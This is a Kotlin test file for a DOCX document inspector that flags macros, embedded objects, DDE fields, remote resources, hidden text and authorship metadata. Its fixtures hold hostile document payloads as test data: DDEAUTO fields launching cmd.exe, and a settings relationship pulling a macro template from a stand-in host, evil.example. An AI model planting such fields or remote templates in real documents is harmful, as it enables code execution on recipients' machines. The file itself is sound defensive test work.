package ua.hramota.doc.docx

import androidx.test.ext.junit.runners.AndroidJUnit4
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.annotation.Config
import java.io.ByteArrayInputStream
import java.io.ByteArrayOutputStream
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

/** The document inspector finds what a DOCX carries besides its text. */
@RunWith(AndroidJUnit4::class)
@Config(sdk = [35])
class InspectionTest {
    private val w = "xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\""
    private val rel = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"

    private fun docx(vararg parts: Pair<String, String>): ByteArrayInputStream {
        val out = ByteArrayOutputStream()
        ZipOutputStream(out).use { z -> parts.forEach { (n, t) -> z.putNextEntry(ZipEntry(n)); z.write(t.toByteArray()); z.closeEntry() } }
        return ByteArrayInputStream(out.toByteArray())
    }

    @Test fun findsEverything() {
        val body = "<w:p><w:ins w:id=\"1\" w:author=\"x\"><w:r><w:t>new</w:t></w:r></w:ins></w:p>" +
            "<w:p><w:r><w:rPr><w:vanish/></w:rPr><w:t>secret</w:t></w:r></w:p>" +
            "<w:p><w:r><w:instrText xml:space=\"preserve\"> DDEAUTO c:\\\\windows\\\\cmd.exe \"/k calc\" </w:instrText></w:r></w:p>"
        val doc = docx(
            "word/document.xml" to "<?xml version=\"1.0\"?><w:document $w><w:body>$body</w:body></w:document>",
            "word/vbaProject.bin" to "macro",
            "word/embeddings/oleObject1.bin" to "ole",
            "word/_rels/document.xml.rels" to "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">" +
                "<Relationship Id=\"r1\" Type=\"$rel/hyperlink\" Target=\"https://example.org\" TargetMode=\"External\"/>" +
                "<Relationship Id=\"r2\" Type=\"$rel/image\" Target=\"http://tracker.example/pixel.png\" TargetMode=\"External\"/></Relationships>",
            "word/_rels/settings.xml.rels" to "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">" +
                "<Relationship Id=\"t1\" Type=\"$rel/attachedTemplate\" Target=\"https://evil.example/t.dotm\" TargetMode=\"External\"/></Relationships>",
            "word/comments.xml" to "<w:comments $w><w:comment w:id=\"0\"><w:p/></w:comment><w:comment w:id=\"1\"><w:p/></w:comment></w:comments>",
            "docProps/core.xml" to "<cp:coreProperties xmlns:cp=\"http://schemas.openxmlformats.org/package/2006/metadata/core-properties\" " +
                "xmlns:dc=\"http://purl.org/dc/elements/1.1/\"><dc:creator>Test Person</dc:creator><cp:lastModifiedBy>Other Person</cp:lastModifiedBy></cp:coreProperties>",
        )
        val i = DocxReader.read(doc).inspection
        assertTrue(i.macros)
        assertEquals(listOf("oleObject1.bin"), i.embedded)
        assertEquals(1, i.links)
        assertEquals(2, i.remoteResources)
        assertTrue(i.dde)
        assertTrue(i.trackedChanges)
        assertTrue(i.hiddenText)
        assertEquals(2, i.comments)
        assertEquals("Test Person", i.author)
        assertEquals("Other Person", i.lastModifiedBy)
        assertTrue(i.risky)
    }

    // The word in ordinary text is not a field; the field in any case and spacing is
    @Test fun ddeOnlyAsAField() {
        fun dde(body: String) = DocxReader.read(docx("word/document.xml" to "<w:document $w><w:body>$body</w:body></w:document>")).inspection.dde
        assertFalse(dde("<w:p><w:r><w:t>Модель dde і ddeauto в тексті, Ddemo</w:t></w:r></w:p>"))
        assertTrue(dde("<w:p><w:r><w:instrText> DdeAuto c:\\x.exe</w:instrText></w:r></w:p>"))
        assertTrue(dde("<w:p><w:r><w:instrText>DDE x y</w:instrText></w:r></w:p>"))
        assertTrue(dde("<w:p><w:fldSimple w:instr=\" dde x\"/></w:p>"))
    }

    @Test fun findsHiddenVariants() {
        val doc = docx(
            "word/document.xml" to "<w:document $w><w:body><w:p><w:fldSimple w:instr=\"ddeauto c:\\\\x.exe\"/></w:p></w:body></w:document>",
            "Word/Embeddings/Object 1.BIN" to "ole",
            "word/vbaData.xml" to "<x/>",
        )
        val i = DocxReader.read(doc).inspection
        assertTrue(i.dde)
        assertTrue(i.macros)
        assertEquals(listOf("Object 1.BIN"), i.embedded)
    }

    @Test fun plainDocumentIsQuiet() {
        val i = DocxReader.read(docx("word/document.xml" to "<w:document $w><w:body><w:p><w:r><w:t>text</w:t></w:r></w:p></w:body></w:document>")).inspection
        assertFalse(i.risky)
        assertFalse(i.notable)
    }
}
